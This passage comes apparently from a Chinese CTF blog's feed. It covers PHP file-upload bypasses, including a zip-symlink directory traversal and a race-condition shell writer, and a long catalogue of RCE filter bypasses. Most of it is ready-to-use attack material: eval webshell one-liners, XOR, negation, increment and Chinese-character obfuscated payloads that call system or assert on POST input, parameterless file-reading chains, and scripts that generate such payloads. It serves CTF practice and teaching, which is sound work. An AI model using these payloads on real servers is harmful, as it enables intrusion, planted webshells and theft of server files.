后的字符会被自动删除</p><h3 id="在后面加-或">在后面加.或/.</h3><p>php.<br>有些服务器会直接忽略后面的点，导致绕过黑名单</p><h2 id="使用-zip-文件特性">使用 zip 文件特性</h2><p>将 shell.php 压缩,修改后缀为 1.jpg,上传<br>如果存在读取参数?file=，可以使用 phar 读取<br>phar://./upload/1.jpg/shell.php<br>过滤不严可以用 file://和 php://filter 伪协议直接尝试读取 flag</p><h3 id="CISCN2023-unzip">CISCN2023-unzip</h3><p>利用软连接，进行目录穿越，将文件上传到任意目录</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var</span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">ln</span> -s /var/www/html <span class="built_in">link</span></span><br><span class="line">zip --symlinks exp1.zip <span class="built_in">link</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="built_in">link</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span> &gt; shell.php</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">zip -r exp2.zip <span class="built_in">link</span>/</span><br></pre></td></tr></table></figure><p>上传 exp1.zip,exp2.zip,服务器解压时把 shell.php 解压到/var/www/html。实现 getshell。</p><h2 id="文件内容无字母">文件内容无字母</h2><p>参考我的 RCE <a href="https://blog.hatchet.top/posts/26728343">各种 RCE 绕过</a><br>把开头的?&gt;去掉就可以用于文件上传,不要 url 编码</p><h1 id="条件竞争">条件竞争</h1><p>有些上传题允许上传 php 脚本，但会很快删除，我们只用构造一个生成 php 马的 php 文件不停上传这个 php 文件并访问，只要成功执行就能传马。</p><p>a.php</p><pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;, &quot;w&quot;), '&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;'); ?&gt;</code></pre><p>用 burp intruder，payload 选 null payload 无限，一个上传 a.php,一个读取 a.php。就能传上 shell.php</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种RCE绕过</title>
      <link href="/posts/26728343.html"/>
      <url>/posts/26728343.html</url>
      
        <content type="html"><![CDATA[<h1 id="一些常见-RCE-形式">一些常见 RCE 形式</h1><pre><code>eval($_POST[1]);`$_GET[1]`;?&gt;&lt;?=`&#123;$&#123;_GET&#125;[1]&#125;`?&gt;</code></pre><h1 id="eval-assert-的-RCE">eval(),assert()的 RCE</h1><p>核心是写个一句话马让蚁剑去连</p><pre><code>?cmd=file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST['cmd']);?&gt;&quot;);?cmd=fputs(fopen('dotast.php','w'),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==\&quot;));?cmd=fwrite(fopen('phpinfo.php','a'),'&lt;?php%20phpinfo();?&gt;');?cmd=echo%20'&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;'%20&gt;%201.php?cmd=?&gt;&lt;?=`ls`;</code></pre><p>写 assert 时候蚁剑编码器选 base64</p><h1 id="无字母数字-RCE">无字母数字 RCE</h1><ul><li>因为$,+等会被 url 混淆，务必使用 url 编码特殊字符！！！</li></ul><h2 id="异或绕过">异或绕过</h2><pre><code>(&quot;%0f%08%0f%09%0e%06%0f&quot;^&quot;%7f%60%7f%60%60%60%60&quot;)(); //phpinfo();</code></pre><ul><li><p>assert($_POST[_]);//PHP version&lt;7.1</p><pre><code>$_=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>  $_=&quot;(\&quot;((%-&quot;^&quot;[[[\\@@&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[_]);</code></pre></li></ul><p>构造异或脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$result1</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$result2</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="取反绕过">取反绕过</h2><p>PHP7</p><pre><code>(~%8F%97%8F%96%91%99%90)(); //phpinfo(); 查看disable_functions(~%8C%86%8C%8B%9A%92)(~%93%8C);//system(&quot;ls&quot;);(~%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(~%D0%99%93%9E%98);//highlight_file(&quot;/flag&quot;);(~%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(~%8C%86%8C%8B%9A%92,~%88%97%90%9E%92%96); //call_user_func(system,whoami);</code></pre><p>构造取反脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload1</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload2</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload3</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;,~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload1</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload3</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP5</p><ul><li><p>assert($_POST[_]);//PHP version&lt;7.1</p><pre><code>$_=~%22%9e%8c%8c%9a%8d%8b%22;$__=~%22%a0%af%b0%ac%ab%22;$___=$$__;$_($___[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>$_=~&quot;%8C%86%8C%8B%9A%92&quot;;$__=~&quot;%a0%af%b0%ac%ab&quot;;$___=$$__;$_($___[_]);</code></pre></li></ul><h2 id="中文绕过-全部字符-url-编码">中文绕过(全部字符 url 编码))</h2><ul><li><p>assert($_POST[_]);//PHP version&lt;7.1</p><pre><code>?&gt;&lt;?=$_++;$__=&quot;极&quot;;$___=~($__&#123;$_&#125;);$__=&quot;区&quot;;$___.=~($__&#123;$_&#125;);$___.=~($__&#123;$_&#125;);$__=&quot;皮&quot;;$___.=~($__&#123;$_&#125;);$__=&quot;十&quot;;$___.=~($__&#123;$_&#125;);$__=&quot;勺&quot;;$___.=~($__&#123;$_&#125;);$____='_';$__=&quot;寸&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;小&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;欠&quot;;$____.=~($__&#123;$_&#125;);$__=&quot;立&quot;;$____.=~($__&#123;$_&#125;);$_=$$____;$___($_[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>?&gt;&lt;?=$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];$_=$$____;$___($_[_]);</code></pre></li></ul><h2 id="自增绕过">自增绕过</h2><ul><li><p>system($_POST[_]);</p><pre><code>?&gt;&lt;?=@$_=[].'',@$__=$_[''],$___='',$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$___.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,$____='_',$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,$_=$$____,$___($_[_])?&gt;</code></pre></li><li><p>assert($<em>POST[</em>]);</p><pre><code>?&gt;&lt;?=$_=[];$_=@&quot;$_&quot;;$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></pre></li><li><p>两个参数都自己控制</p><pre><code>  //post传参  cmd=$_=[]._;$__=$_['!'==','];$__++;$__++;$__++;$___=++$__;++$__;$___=++$__.$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$___=$___.++$__;$_='_'.$___;$$_[_]($$_[__]);  //get传参  ?_=system&amp;__=ls /</code></pre></li></ul><h3 id="长度限制">长度限制</h3><pre><code>$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);//长度118    $_GET[1]($_GET[2])</code></pre><h2 id="其他的杂项">其他的杂项</h2><h3 id="屏蔽了-导致-GET-POST-失效">屏蔽了_导致_GET,_POST 失效</h3><pre><code>异或a=?%3E%3C?=`&#123;$&#123;&quot;!%27%25(&quot;^&quot;%7e%60%60%7c&quot;&#125;[%a0]&#125;`?%3E&amp;%a0=whoami取反a=?%3E%3C?=`&#123;$&#123;~%22%a0%b8%ba%ab%22&#125;[%a0]&#125;`?%3E&amp;%a0=whoami</code></pre><h3 id="自增写马">自增写马</h3><pre><code>?&gt;&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____='_'?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_],$_[___])?&gt;POST部分__=file_put_contents&amp;_=shell.php&amp;___=&lt;?=eval($_POST['cmd'])?&gt;</code></pre><h1 id="无参数-RCE">无参数 RCE</h1><h2 id="构造-payload">构造 payload</h2><h3 id="一些用于构造的函数">一些用于构造的函数</h3><p>print_r(),var_dump()：输出函数<br>readfile(),highlight_file(),show_source()：读取文件<br>echo(file_get_contents()),echo(serialize(file()))也可以读取文件<br>getcwd()：获取当前目录<br>dirname()：获取上层目录<br>scandir()：等同 ls<br>chdir()：改变目录，要和 dirname 搭配使用以吃掉 chdir 的 bool 值。例如：</p><pre><code>dirname(chdir(dirname(dirname(dirname(getcwd())))));</code></pre><ul><li>可以用 prev(),next(),reset(),end(),array_reverse()获取到 flag.php(仅限 flag.php 位于数组前后两位)，然后用 readfile()读取。</li></ul><p>获取点号字符’.'：</p><pre><code>1.pos(localeconv())，current(localeconv())2.chr(pos(localtime(time()))) 等秒数为 46，注：47 时是斜杠。3.利用 phpversion()echo(phpversion());如果版本以 5或7 开头，可以利用数学方法构造出 46，47（这个理论上能用到PHP8，到出PHP9时我估计早不碰PHP了吧）echo(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))); 点号echo(chr(ceil(sinh(sinh(acos(tan(tan(sqrt(floor(phpversion())))))))))); 斜杠我让gpt帮我写了份爆破脚本在下面，大家构造时可以找着黑名单改4.crypt()chr(ord(strrev(crypt(phpversion()))));这里的phpversion可取任何一个返回字符串的函数，利用随机性返回点号，同样有几率返回斜杠。</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 无参RCE构造47爆破脚本</span></span><br><span class="line"><span class="comment">// 固定前三层：sqrt(floor(phpversion()))</span></span><br><span class="line"><span class="comment">// 后面使用三角函数组合</span></span><br><span class="line"><span class="comment">// 最后使用ceil/floor/round取整</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可用的三角函数</span></span><br><span class="line"><span class="variable">$trigFunctions</span> = [<span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取整函数</span></span><br><span class="line"><span class="variable">$roundingFunctions</span> = [<span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;round&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基础表达式</span></span><br><span class="line"><span class="variable">$base</span> = <span class="string">&#x27;sqrt(floor(phpversion()))&#x27;</span>;  <span class="comment">// 在PHP7下=2.645-&gt;floor=2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大尝试深度（在基础表达式之后）</span></span><br><span class="line"><span class="variable">$maxDepth</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存储找到的有效表达式</span></span><br><span class="line"><span class="variable">$foundExpressions</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildTrigChain</span>(<span class="params"><span class="variable">$current</span>, <span class="variable">$depth</span>, <span class="variable">$maxDepth</span>, &amp;<span class="variable">$foundExpressions</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$trigFunctions</span>, <span class="variable">$roundingFunctions</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$depth</span> &gt;= <span class="variable">$maxDepth</span>) &#123;</span><br><span class="line">        <span class="comment">// 尝试各种取整函数</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$roundingFunctions</span> <span class="keyword">as</span> <span class="variable">$roundFunc</span>) &#123;</span><br><span class="line">            <span class="variable">$expr</span> = <span class="string">&quot;<span class="subst">$roundFunc</span>(<span class="subst">$current</span>)&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$val</span> = <span class="keyword">eval</span> (<span class="string">&quot;return <span class="subst">$expr</span>;&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$val</span> == <span class="number">47</span>) &#123;</span><br><span class="line">                    <span class="variable">$foundExpressions</span>[] = <span class="variable">$expr</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;Found: <span class="subst">$expr</span> = <span class="subst">$val</span>\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 忽略计算错误</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 继续添加三角函数</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$trigFunctions</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">buildTrigChain</span>(<span class="string">&quot;<span class="subst">$func</span>(<span class="subst">$current</span>)&quot;</span>, <span class="variable">$depth</span> + <span class="number">1</span>, <span class="variable">$maxDepth</span>, <span class="variable">$foundExpressions</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Starting爆破...\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Base expression: <span class="subst">$base</span> = &quot;</span> . <span class="keyword">eval</span> (<span class="string">&quot;return <span class="subst">$base</span>;&quot;</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">buildTrigChain</span>(<span class="variable">$base</span>, <span class="number">0</span>, <span class="variable">$maxDepth</span>, <span class="variable">$foundExpressions</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$foundExpressions</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有找到能生成47的表达式\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n找到的表达式：\n&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$foundExpressions</span> <span class="keyword">as</span> <span class="variable">$expr</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;- <span class="subst">$expr</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="跨目录">跨目录</h3><p>第一种方法是用 chdir 和 dirname，但有些题会 ban 掉 dirname 或 getcwd 导致不能任意穿梭。<br>这时就需要构造 chdir(‘…’)或 scandir(‘/’)<br>难点在于吃掉 chdir 的 bool 值，<s>PHP&gt;7.1 的绕过我暂时没找到。</s> 天无绝人之路！我终于发现 date 可以吃掉这个值了。</p><h4 id="利用-time-吃掉-chdir-的-bool-值">利用 time()吃掉 chdir 的 bool 值</h4><p>适用版本：PHP 5.1-PHP 7.0，因为 time()允许传参只在这些版本存在。<br>payload：</p><pre><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></pre><p>第一段：chdir(next(scandir(pos(localeconv()))))<br>等同于 chdir(‘…’)，跳转到上层目录</p><p>第二段：end(scandir(chr(pos(localtime(time())))))<br>这里的点号就用 chr(pos(localtime(time())))来获取，pos 获取了 time()的秒数。</p><p>当 second=46 时 是点号，second=47 时 是斜杠。</p><h3 id="利用-array-date-吃掉-chdir-的-bool-值">利用 array(date())吃掉 chdir 的 bool 值</h3><pre><code>print_r(scandir((chr(ord(strrev(crypt(serialize(array(date(chdir(next(scandir(pos(localeconv()))))))))))))));</code></pre><p>这个是利用了 crypt 加密时有几率返回点值和斜杠的特性。</p><pre><code>readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array(date(chdir(next(scandir(pos(localeconv())))))))))))))));</code></pre><p>两次随机有点看脸。</p><h3 id="使用-arrar-rand-来获取-array-中的随机项">使用 arrar_rand()来获取 array 中的随机项</h3><pre><code>print_r(scandir(dirname(chdir(dirname(getcwd())))));//获取根目录文件highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))))//随机读取，多次读取得到flag</code></pre><h3 id="使用-session-值">使用 session 值</h3><pre><code>RCE部分：?exp=eval(hex2bin(session_id(session_start())));PHPSESSID：PHPSESSID=706870696e666f28293b// echo bin2hex('phpinfo();');</code></pre><h3 id="getenv">getenv()</h3><pre><code>在header最后写上sky:cat /flagprint_r(end(getallheaders()));system(end(getallheaders()));或者print_r(end(current(get_definded_vars((())))))&amp;sky=phpinfo();eval(end(current(get_definded_vars((())))))&amp;sky=phpinfo();</code></pre><h1 id="无字母数字参数-RCE">无字母数字参数 RCE</h1><p>phpinfo():[~%8F%97%8F%96%91%99%90][~%FF]();<br>加[~%FF]只是因为 php7 的解析方式，例如[~%EF],[~%CF]也能通过检测。<br>通过 getenv() RCE</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span 